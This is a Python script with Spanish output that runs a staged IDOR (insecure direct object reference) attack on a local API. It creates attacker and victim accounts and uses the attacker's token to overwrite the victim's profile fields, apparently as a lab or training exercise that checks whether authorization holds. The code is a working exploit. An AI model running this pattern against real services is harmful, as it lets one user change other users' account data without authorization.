import time
import requests

BASE_URL = "http://localhost:8091"

# ============= DATOS DE USUARIOS =============
USERS = {
    "attacker": {
        "username": "test_42",
        "password": "123456",
        "phone_number": "31285634434",
        "first_name": "Daniel",
        "last_name": "Cariaga"
    },
    "victim": {
        "username": "test_12",
        "password": "654321",
        "phone_number": "318596958377",
        "first_name": "Brayan",
        "last_name": "Martinez"
    }
}

# ============= FUNCIONES AUXILIARES =============
def slow_print(msg, delay=1.5):
    """Imprime mensaje con delay para visualizar el proceso"""
    print(msg)
    time.sleep(delay)

def separator(title=""):
    """Imprime separador visual"""
    print("\n" + "="*70)
    if title:
        print(f"  {title}")
        print("="*70)
    print()

# ============= FUNCIONES DE API =============
def register_user(user_data):
    """Registra un nuevo usuario"""
    slow_print(f"üìù Registrando usuario: {user_data['username']}")
    
    payload = {
        "username": user_data["username"],
        "password": user_data["password"],
        "phone_number": user_data["phone_number"],
        "first_name": user_data["first_name"],
        "last_name": user_data["last_name"]
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/register",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        slow_print(f"‚úÖ Respuesta [{r.status_code}]: {r.text}")
        
        if r.status_code == 200 or r.status_code == 201:
            slow_print(f"‚úÖ Usuario '{user_data['username']}' creado exitosamente\n")
            return True
        else:
            slow_print(f"‚ö†Ô∏è  Posible error en registro\n")
            return False
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n")
        return False

def get_token(username, password):
    """Obtiene token de autenticaci√≥n"""
    slow_print(f"üîë Obteniendo token para: {username}")
    
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/token",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        if r.status_code == 200:
            token_data = r.json()
            token = token_data.get("access_token")
            slow_print(f"‚úÖ Token obtenido: {token[:50]}...\n")
            return token
        else:
            slow_print(f"‚ùå Error [{r.status_code}]: {r.text}\n")
            return None
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n")
        return None

def get_profile(token, username=None):
    """Consulta el perfil del usuario"""
    if username:
        slow_print(f"üë§ Consultando perfil de: {username}")
    else:
        slow_print(f"üë§ Consultando perfil del usuario autenticado")
    
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        r = requests.get(
            f"{BASE_URL}/profile",
            headers=headers
        )
        
        if r.status_code == 200:
            profile_data = r.json()
            slow_print(f"‚úÖ Perfil obtenido [{r.status_code}]:")
            slow_print(f"   {r.text}\n")
            return profile_data
        else:
            slow_print(f"‚ùå Error [{r.status_code}]: {r.text}\n")
            return None
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n")
        return None

def update_profile(token, target_username, updates):
    """Actualiza el perfil - AQU√ç OCURRE EL IDOR"""
    slow_print(f"‚úèÔ∏è  Intentando actualizar perfil de: {target_username}")
    slow_print(f"   Datos a modificar: {updates}")
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # El payload incluye el username de OTRA persona (IDOR)
    payload = {
        "username": target_username,
        **updates
    }
    
    try:
        r = requests.put(
            f"{BASE_URL}/profile",
            json=payload,
            headers=headers
        )
        slow_print(f"\nüì° Respuesta [{r.status_code}]: {r.text}\n")
        
        if r.status_code == 200:
            return True, r.json()
        else:
            return False, None
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n")
        return False, None

# ============= SCRIPT PRINCIPAL - EXPLOIT LEVEL 2 =============
def main():
    separator("üö® EXPLOIT LEVEL 2 - IDOR ATTACK (Ejecuci√≥n Lenta)")
    
    slow_print("üìã Descripci√≥n del ataque:")
    slow_print("   Insecure Direct Object Reference (IDOR)")
    slow_print("   Un usuario (atacante) intenta modificar el perfil")
    slow_print("   de OTRO usuario (v√≠ctima) sin autorizaci√≥n\n")
    
    # ===== PASO 1: REGISTRAR USUARIOS =====
    separator("PASO 1: Registrar usuarios")
    
    slow_print(f"üë• Registrando usuario ATACANTE: {USERS['attacker']['username']}")
    if not register_user(USERS["attacker"]):
        slow_print("‚ùå No se pudo crear el atacante. Abortando...\n")
        return
    
    slow_print(f"üë• Registrando usuario V√çCTIMA: {USERS['victim']['username']}")
    if not register_user(USERS["victim"]):
        slow_print("‚ùå No se pudo crear la v√≠ctima. Abortando...\n")
        return
    
    # ===== PASO 2: OBTENER TOKENS =====
    separator("PASO 2: Obtener tokens de autenticaci√≥n")
    
    attacker_token = get_token(USERS["attacker"]["username"], USERS["attacker"]["password"])
    if not attacker_token:
        slow_print("‚ùå No se pudo obtener token del atacante. Abortando...\n")
        return
    
    victim_token = get_token(USERS["victim"]["username"], USERS["victim"]["password"])
    if not victim_token:
        slow_print("‚ùå No se pudo obtener token de la v√≠ctima. Abortando...\n")
        return
    
    # ===== PASO 3: VER PERFIL INICIAL DE LA V√çCTIMA =====
    separator("PASO 3: Consultar perfil inicial de la v√≠ctima")
    
    slow_print("üì∏ Capturando estado inicial del perfil de la v√≠ctima...\n")
    initial_victim_profile = get_profile(victim_token, USERS["victim"]["username"])
    
    if initial_victim_profile:
        slow_print("üìä ESTADO INICIAL DE LA V√çCTIMA:")
        slow_print(f"   Username: {initial_victim_profile.get('username', 'N/A')}")
        slow_print(f"   Nombre: {initial_victim_profile.get('first_name', 'N/A')} {initial_victim_profile.get('last_name', 'N/A')}")
        slow_print(f"   Tel√©fono: {initial_victim_profile.get('phone_number', 'N/A')}\n")
    
    # ===== PASO 4: EJECUTAR ATAQUE IDOR =====
    separator("PASO 4: Ejecutar ataque IDOR")
    
    slow_print("‚ö†Ô∏è  ATACANTE intenta modificar perfil de V√çCTIMA...")
    slow_print(f"   Token usado: Token de {USERS['attacker']['username']}")
    slow_print(f"   Target: Perfil de {USERS['victim']['username']}\n")
    
    malicious_updates = {
        "phone_number": "11111111",
        "first_name": "Hackeado",
        "last_name": f"Por{USERS['attacker']['username']}"
    }
    
    success, response = update_profile(
        token=attacker_token,
        target_username=USERS["victim"]["username"],
        updates=malicious_updates
    )
    
    # ===== PASO 5: VERIFICAR RESULTADO =====
    separator("PASO 5: Verificar si el ataque fue exitoso")
    
    slow_print("üîç Consultando perfil de la v√≠ctima nuevamente...\n")
    final_victim_profile = get_profile(victim_token, USERS["victim"]["username"])
    
    # ===== AN√ÅLISIS DE VULNERABILIDAD =====
    separator("üìä AN√ÅLISIS DE RESULTADOS")
    
    if final_victim_profile and initial_victim_profile:
        # Comparar datos antes y despu√©s
        phone_changed = (initial_victim_profile.get('phone_number') != 
                        final_victim_profile.get('phone_number'))
        name_changed = (initial_victim_profile.get('first_name') != 
                       final_victim_profile.get('first_name'))
        
        slow_print("üìã COMPARACI√ìN ANTES vs DESPU√âS:\n")
        slow_print(f"   Tel√©fono:")
        slow_print(f"      Antes:  {initial_victim_profile.get('phone_number', 'N/A')}")
        slow_print(f"      Despu√©s: {final_victim_profile.get('phone_number', 'N/A')}")
        slow_print(f"      {'üö® MODIFICADO' if phone_changed else '‚úÖ Sin cambios'}\n")
        
        slow_print(f"   Nombre:")
        slow_print(f"      Antes:  {initial_victim_profile.get('first_name', 'N/A')} {initial_victim_profile.get('last_name', 'N/A')}")
        slow_print(f"      Despu√©s: {final_victim_profile.get('first_name', 'N/A')} {final_victim_profile.get('last_name', 'N/A')}")
        slow_print(f"      {'üö® MODIFICADO' if name_changed else '‚úÖ Sin cambios'}\n")
        
        # Veredicto final
        print("\n" + "="*70)
        if phone_changed or name_changed:
            print("üö®üö®üö® ¬°VULNERABILIDAD IDOR CONFIRMADA! üö®üö®üö®")
            print("="*70)
            slow_print(f"\n   ‚ùå La API es VULNERABLE a ataques IDOR")
            slow_print(f"   ‚ùå {USERS['attacker']['username']} modific√≥ el perfil de {USERS['victim']['username']}")
            slow_print(f"   ‚ùå NO se valid√≥ correctamente la autorizaci√≥n")
            slow_print(f"   ‚ùå Un usuario puede modificar datos de OTROS usuarios\n")
        else:
            print("‚úÖ‚úÖ‚úÖ API SEGURA CONTRA IDOR ‚úÖ‚úÖ‚úÖ")
            print("="*70)
            slow_print(f"\n   ‚úÖ La API est√° PROTEGIDA contra IDOR")
            slow_print(f"   ‚úÖ Se valid√≥ correctamente la autorizaci√≥n")
            slow_print(f"   ‚úÖ {USERS['attacker']['username']} NO pudo modificar el perfil de {USERS['victim']['username']}\n")
    else:
        slow_print("‚ö†Ô∏è  No se pudo completar la comparaci√≥n\n")
    
    separator("‚úÖ FIN DEL EXPLOIT LEVEL 2")
    
    slow_print(f"üí° Token atacante: {attacker_token[:50]}...")
    slow_print(f"üí° Token v√≠ctima: {victim_token[:50]}...\n")

if __name__ == "__main__":
    main()